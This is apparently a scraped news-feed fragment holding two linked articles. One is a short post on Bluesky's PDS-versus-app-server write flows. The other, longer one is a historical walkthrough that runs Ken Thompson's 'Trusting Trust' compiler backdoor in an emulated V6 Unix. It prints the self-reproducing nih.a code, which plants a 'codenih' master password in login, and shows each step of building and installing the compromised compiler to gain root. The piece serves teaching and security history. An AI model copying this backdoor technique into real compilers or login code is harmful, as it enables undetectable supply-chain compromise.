&lt;/doc&gt;</content><link href="https://www.bbc.co.uk/news/articles/cr43vx0rrwvo"/><published>2025-11-16T13:44:20+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45945113</id><title>The politics of purely client-side apps</title><updated>2025-11-16T15:08:43.658237+00:00</updated><content>&lt;doc fingerprint="b2b94910f73b66dc"&gt;
  &lt;main&gt;
    &lt;p&gt;You make a post on Bluesky. How does it happen?&lt;/p&gt;
    &lt;p&gt;Option 1:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Your client calls&lt;/p&gt;&lt;code&gt;putRecord&lt;/code&gt;on the user's PDS&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;200 OK, the record was created&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The record goes through the relay to the Bluesky server&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Bluesky servers index the new record&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tada&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Option 2:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Your client calls&lt;/p&gt;&lt;code&gt;createPost&lt;/code&gt;on the Bluesky servers&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The Bluesky servers call&lt;/p&gt;&lt;code&gt;putRecord&lt;/code&gt;on the user's PDS&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Bluesky servers update their indexes&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;200 OK, the record was created&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;(The record shows up again via the relay and can be reindexed if needed)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tada&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Both of these are now possible in the Atmosphere, but which of these options is the "good one"? It turns out, that's a pretty nuanced question.&lt;/p&gt;
    &lt;head rend="h2"&gt;Option 1 - PDS proxies all traffic&lt;/head&gt;
    &lt;p&gt;Option 1 is the "PDS proxies all traffic" philosophy. In this model, the client logs into the PDS and then sends all traffic to the Atmosphere by proxying through the PDS.&lt;/p&gt;
    &lt;p&gt;This has some interesting consequences:&lt;/p&gt;
    &lt;p&gt;1. The client mutates records by directly writing them to the PDS&lt;/p&gt;
    &lt;p&gt;2. The PDS is able to intercept and modify traffic to apps&lt;/p&gt;
    &lt;p&gt;3. There's no opportunity for server-side computation within the lifetime of a transaction&lt;/p&gt;
    &lt;p&gt;Points 1 &amp;amp; 2 have positive political implications. The ability to write directly to a PDS means that third-party "pure clients" (no backend of their own) have a lot of freedom in how they operate. Then the ability to intercept and modify traffic means that a PDS can make decisions on behalf of their users which might be contrary to the application's decisions. These are both good balances against the power of an app.&lt;/p&gt;
    &lt;p&gt;Point 3 just sucks though. What's not obvious about Option 1's flow is that the time between "200 OK" and "Bluesky servers index the record" is indeterminate. The 200 OK ends the transaction from the client's perspective, so now the client is going to struggle to show the user the actions they just took.&lt;/p&gt;
    &lt;p&gt;Right now, the PDS takes advantage of traffic interception to modify &lt;code&gt;getPostThread&lt;/code&gt; and inject the user's recent posts. That does work, but it means the PDS has Bluesky business logic baked in. Not only is that a conceptual violation of the PDS -- which is supposed to be generic -- but it's an option that's not available to every app.&lt;/p&gt;
    &lt;head rend="h2"&gt;Option 2 - App server speaks to PDS&lt;/head&gt;
    &lt;p&gt;Option 2 is the "App server speaks to PDS" philosophy. In this model, the client logs into the app, which in turn logs into the PDS, and then the client speaks entirely to the app. The app then talks to the PDS directly to modify requests.&lt;/p&gt;
    &lt;p&gt;This basically removes all 3 of the consequences in Option 1. There's no problem of ensuring actions are immediately visible to users after a transaction, but now the client isn't in communication with the PDS so the political power of the PDS is reduced.&lt;/p&gt;
    &lt;head rend="h2"&gt;Which should we do here?&lt;/head&gt;
    &lt;p&gt;Ultimately, the Atmosphere community is going to need to align on one of these two methods. The Bluesky app still uses Option 1, but now that OAuth is here the guidance we've been giving is Option 2. Is that the right call?&lt;/p&gt;
    &lt;p&gt;I'm really torn on this. I'm going to just dump an assortment of thoughts, some of which are contradictory.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Purely client-side apps are a good thing&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It sucks when you're building purely client-side and can't do exactly what you want to do, or can't make your customizations perform well&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Services like microcosm are pretty great for enabling those customizations&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Option 2 is much more intuitive to me than Option 1&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Option 2 will always perform better&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It's currently too expensive to build full network app servers in the Atmosphere&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The ability for the PDS to intercept and modify traffic is really good&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The role of the PDS within the political economy of the atmosphere is still not totally clear, but acting as some kind of counterbalance to applications is a really promising idea if we could get more clarity on how that will work&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;My gut says we should be leaning towards Option 2 because it's clearer and because it enables app developers to do more. To handle the costs I'm inclined to think that Bluesky's servers should be available almost like a cloud service, which would drive down costs a lot and generally increase the ability for third-party apps to implement new or different behaviors. This would essentially transfer the political power of the PDS (ie to intercept and modify traffic) over to the third-party applications.&lt;/p&gt;
    &lt;p&gt;Just some thoughts.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://pfrazee.leaflet.pub/3m5hwua4sh22v"/><published>2025-11-16T13:45:35+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45945202</id><title>Running the "Reflections on Trusting Trust" Compiler</title><updated>2025-11-16T15:08:43.156161+00:00</updated><content>&lt;doc fingerprint="26c09b19bfbb2d04"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Running the “Reflections on Trusting Trust” Compiler Posted on Wednesday, October 25, 2023. &lt;/head&gt;
    &lt;p&gt;Supply chain security is a hot topic today, but it is a very old problem. In October 1983, 40 years ago this week, Ken Thompson chose supply chain security as the topic for his Turing award lecture, although the specific term wasn’t used back then. (The field of computer science was still young and small enough that the ACM conference where Ken spoke was the “Annual Conference on Computers.”) Ken’s lecture was later published in Communications of the ACM under the title “Reflections on Trusting Trust.” It is a classic paper, and a short one (3 pages); if you haven’t read it yet, you should. This post will still be here when you get back.&lt;/p&gt;
    &lt;p&gt;In the lecture, Ken explains in three steps how to modify a C compiler binary to insert a backdoor when compiling the “login” program, leaving no trace in the source code. In this post, we will run the backdoored compiler using Ken’s actual code. But first, a brief summary of the important parts of the lecture.&lt;/p&gt;
    &lt;head rend="h2"&gt;Step 1: Write a Self-Reproducing Program&lt;/head&gt;
    &lt;p&gt;Step 1 is to write a program that prints its own source code. Although the technique was not widely known in 1975, such a program is now known in computing as a “quine,” popularized by Douglas Hofstadter in Gödel, Escher, Bach. Here is a Python quine, from this collection:&lt;/p&gt;
    &lt;code&gt;
s=’s=%r;print(s%%s)’;print(s%s)
&lt;/code&gt;
    &lt;p&gt;And here is a slightly less cryptic Go quine:&lt;/p&gt;
    &lt;code&gt;
package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `package main
func main() { print(q + "\x60" + q + "\x60") }
var q = `
&lt;/code&gt;
    &lt;p&gt;The general idea of the solution is to put the text of the program into a string literal, with some kind of placeholder where the string itself should be repeated. Then the program prints the string literal, substituting that same literal for the placeholder. In the Python version, the placeholder is &lt;code&gt;%r&lt;/code&gt;;
in the Go version, the placeholder is implicit at the end of the string.
For more examples and explanation, see my post “Zip Files All The Way Down,” which uses a Lempel-Ziv quine to construct a zip file that contains itself.
&lt;/p&gt;
    &lt;head rend="h2"&gt;Step 2: Compilers Learn&lt;/head&gt;
    &lt;p&gt;Step 2 is to notice that when a compiler compiles itself, there can be important details that persist only in the compiler binary, not in the actual source code. Ken gives the example of the numeric values of escape sequences in C strings. You can imagine a compiler containing code like this during the processing of escaped string literals:&lt;/p&gt;
    &lt;quote&gt;c = next(); if(c == '\\') { c = next(); if(c == 'n') c = '\n'; }&lt;/quote&gt;
    &lt;p&gt; That code is responsible for processing the two character sequence &lt;code&gt;\n&lt;/code&gt;
in a string literal
and turning it into a corresponding byte value,
specifically &lt;code&gt;’\n’&lt;/code&gt;.
But that’s a circular definition, and the first time you write code like that it won’t compile.
So instead you write &lt;code&gt;c = 10&lt;/code&gt;,
you compile and install the compiler, and then you can change
the code to &lt;code&gt;c = ’\n’&lt;/code&gt;.
The compiler has “learned” the value of &lt;code&gt;’\n’&lt;/code&gt;,
but that value only appears in the compiler binary,
not in the source code.
&lt;/p&gt;
    &lt;head rend="h2"&gt;Step 3: Learn a Backdoor&lt;/head&gt;
    &lt;p&gt; Step 3 is to put these together to help the compiler “learn” to miscompile the target program (&lt;code&gt;login&lt;/code&gt; in the lecture).
It is fairly straightforward to write code in a compiler
to recognize a particular input program and modify its code,
but that code would be easy to find if the compiler source were inspected.
Instead, we can go deeper, making two changes to the compiler:
&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Recognize &lt;code&gt;login&lt;/code&gt;and insert the backdoor.&lt;/item&gt;
      &lt;item&gt;Recognize the compiler itself and insert the code for these two changes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The “insert the code for these two changes” step requires being able to write a self-reproducing program: the code must reproduce itself into the new compiler binary. At this point, the compiler binary has “learned” the miscompilation steps, and the clean source code can be restored.&lt;/p&gt;
    &lt;head rend="h2"&gt;Running the Code&lt;/head&gt;
    &lt;p&gt;At the Southern California Linux Expo in March 2023, Ken gave the closing keynote, a delightful talk about his 75-year effort accumulating what must be the world’s largest privately held digital music collection, complete with actual jukeboxes and a player piano (video opens at 10m43s, when his talk begins). During the Q&amp;amp;A session, someone jokingly asked about the Turing award lecture, specifically “can you tell us right now whether you have a backdoor into every copy of gcc and Linux still today?” Ken replied:&lt;/p&gt;
    &lt;quote&gt;I assume you’re talking about some paper I wrote a long time ago. No, I have no backdoor. That was very carefully controlled, because there were some spectacular fumbles before that. I got it released, or I got somebody to steal it from me, in a very controlled sense, and then tracked whether they found it or not. And they didn’t. But they broke it, because of some technical effect, but they didn’t find out what it was and then track it. So it never got out, if that’s what you’re talking about. I hate to say this in front of a big audience, but the one question I’ve been waiting for since I wrote that paper is “you got the code?” Never been asked. I still have the code.&lt;/quote&gt;
    &lt;p&gt;Who could resist that invitation!? Immediately after watching the video on YouTube in September 2023, I emailed Ken and asked him for the code. Despite my being six months late, he said I was the first person to ask and mailed back an attachment called &lt;code&gt;nih.a&lt;/code&gt;,
a cryptic name for a cryptic program.
(Ken tells me it does in fact stand for “not invented here.”)
Normally today, &lt;code&gt;.a&lt;/code&gt; files are archives containing
compiler object files,
but this one contains two source files.&lt;/p&gt;
    &lt;p&gt; The code applies cleanly to the C compiler from the Research Unix Sixth Edition (V6). I’ve posted an online emulator that runs V6 Unix programs and populated it with some old files from Ken and Dennis, including &lt;code&gt;nih.a&lt;/code&gt;.
Let’s actually run the code.
You can follow along in the simulator.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Login as &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;login: ken Password: ken % who ken tty8 Aug 14 22:06 %&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Change to and list the &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% chdir nih % ls nih.a&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Extract &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ar xv nih.a x x.c x rc&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s read &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cat x.c&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Declare the global variable &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;nihflg;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt; Define the function &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;codenih() { char *p,*s; int i;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;quote&gt;if(pflag) return;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Skip leading tabs in the line.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=line; while(*p=='\t') p++;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Look for the line&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;s="namep = crypt(pwbuf);"; for(i=0;i&amp;lt;21;i++) if(s[i]!=p[i]) goto l1;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Define &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=+i; s="for(c=0;c&amp;lt;8;c++)" "if(\"codenih\"[c]!=pwbuf[c])goto x1x;" "while(*namep)namep++;" "while(*np!=':')np++;x1x:";&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;With the &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;for(i=0;;i++) if(!(*p++=s[i])) break; goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;No match for &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;l1: s="av[4] = \"-P\";"; for(i=0;i&amp;lt;13;i++) if(s[i]!=p[i]) goto l2;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Increment &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;nihflg++; goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt; Next target: input reading loop in &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;l2: if(nihflg!=1) goto l3; s="while(getline()) {"; for(i=0;i&amp;lt;18;i++) if(s[i]!=p[i]) goto l3;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt; Append input-reading backdoor: call &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=+i; s="codenih();"; for(i=0;;i++) if(!(*p++=s[i])) break; nihflg++; goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Next target: flushing output in &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;l3: if(nihflg!=2) goto l4; s="fflush(obuf);"; for(i=0;i&amp;lt;13;i++) if(s[i]!=p[i]) goto l4;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Insert end-of-file backdoor: call &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;p=+i; s="repronih();"; for(i=0;;i++) if(!(*p++=s[i])) break; nihflg++; l4:; }&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Here the magic begins, as presented in the&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;char nihstr[] { %0 };&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The magic continues.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;repronih() { int i,n,c;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;If &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;if(nihflg!=3) return;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;p&gt;The most cryptic part of the whole program.&lt;/p&gt;&lt;code&gt;n=0&lt;/code&gt;: emit literal text before “&lt;code&gt;%&lt;/code&gt;”&lt;code&gt;n=1&lt;/code&gt;: emit octal bytes of text before “&lt;code&gt;%&lt;/code&gt;”&lt;code&gt;n=2&lt;/code&gt;: emit octal bytes of “&lt;code&gt;%&lt;/code&gt;” and rest of file&lt;code&gt;n=3&lt;/code&gt;: no output, looking for “&lt;code&gt;%&lt;/code&gt;”&lt;code&gt;n=4&lt;/code&gt;: emit literal text after “&lt;code&gt;%&lt;/code&gt;”&lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;n=0; i=0; for(;;) switch(c=nihstr[i++]){&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;quote&gt;case 045: n++; if(n==1) i=0; if(n!=2) continue;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;In phases 1 and 2, emit octal byte value&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;default: if(n==1||n==2){ putc('0',obuf); if(c&amp;gt;=0100) putc((c&amp;gt;&amp;gt;6)+'0',obuf); if(c&amp;gt;=010) putc(((c&amp;gt;&amp;gt;3)&amp;amp;7)+'0',obuf); putc((c&amp;amp;7)+'0',obuf); putc(',',obuf); putc('\n',obuf); continue; }&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;In phases 0 and 4, emit literal byte value,&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;if(n!=3) putc(c,obuf); continue;&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Reaching end of &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;case 0: n++; i=0; if(n==5){ fflush(obuf); return; } } }&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Now let’s read &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cat rc&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Start the editor &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;ed x.c&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Delete all tabs from every line.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/ //g&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Write the modified file to &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;w nih.c q&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Octal dump bytes of &lt;/p&gt;
          &lt;code&gt;% echo az | od -b&lt;/code&gt;
          &lt;p&gt;Note the trailing &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;od -b nih.c &amp;gt;x&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Back into &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;ed x&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Remove the leading file offsets, adding a &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/^....... 0*/0/&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Replace each space before a byte value&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/ 0*/\ 0/g&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Delete 0 values caused by odd-length padding&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;g/^0$/d&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add trailing commas to each line.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;1,$s/$/,/&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Write &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;w x e nih.c&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Move to and delete the magic &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;/%/d&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Read &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;.-1r x&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add a trailing &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;.a 0 .&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Write &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;w nih.c q&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s run &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% sh rc 1314 1163 5249 6414 1163 6414 7576&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s check the output, &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cat nih.c nihflg; codenih() { char *p,*s; int i; if(pflag) return; ... char nihstr[] { 0156, 0151, 0150, 0146, ... 0175, 012, 0175, 012, 0 }; repronih() { int i,n,c; ...&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s make an evil compiler,&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cp /usr/source/s1/cc.c cc.c % cp cc.c ccevil.c % ed ccevil.c 12902&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;/getline/ while(getline()) { s/$/ codenih();/ . while(getline()) { codenih();&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;/fflush/ fflush(obuf); s/$/ repronih();/ . fflush(obuf); repronih();&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Add &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;$r nih.c 7576 w 20501 q&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Build the evil and good code with the good &lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cc ccevil.c; mv a.out ccevil % cc cc.c; mv a.out ccgood % ls -l ccevil ccgood -rwxrwxrwx 1 ken 12918 Aug 14 22:19 ccevil -rwxrwxrwx 1 ken 10724 Aug 14 22:19 ccgood&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The good compiler still compiles&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ccgood cc.c % ls -l a.out -rwxrwxrwx 1 ken 10724 Aug 14 22:19 a.out&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The evil compiler compiles&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ccevil cc.c % ls -l a.out -rwxrwxrwx 1 ken 12918 Aug 14 22:19 a.out&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The evil compilers don’t match exactly,&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% cmp a.out ccevil a.out ccevil differ: char 9428, line 377 % cmp -l a.out ccevil 9428 56 145 9429 157 166 9430 0 151 9431 0 154 9432 0 56 9433 0 157 % cp a.out ccevil % ccevil cc.c % cmp a.out ccevil %&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s install the evil compiler.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% su password: root # cp ccevil /bin/cc&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;Let’s rebuild everything from clean sources.&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;# cc /usr/source/s1/cc.c # cp a.out /bin/cc # ls -l /bin/cc -rwxrwxr-x 1 bin 12918 Aug 14 22:30 /bin/cc # cc /usr/source/s1/login.c # cp a.out /bin/login # ^D&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Now we can log in as root&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;quote&gt;% ^D login: root Password: codenih # who root tty8 Aug 14 22:32 #&lt;/quote&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Timeline&lt;/head&gt;
    &lt;p&gt;This code can be dated to some time in the one-year period from June 1974 to June 1975, probably early 1975.&lt;/p&gt;
    &lt;p&gt; The code does not work in V5 Unix, released in June 1974. At the time, the C preprocessor code only processed input files that began with the first character ‘#’. The backdoor is in the preprocessor, and the V5 &lt;code&gt;cc.c&lt;/code&gt; did not start with ‘#’
and so wouldn’t have been able to modify itself.
The Air Force review of Multics security
that Ken credits for inspiring the backdoor is also dated June 1974.
So the code post-dates June 1974.
&lt;/p&gt;
    &lt;p&gt;Although it wasn’t used in V6, the archive records the modification time (mtime) of each file it contains. We can read the mtime directly from the archive using a modern Unix system:&lt;/p&gt;
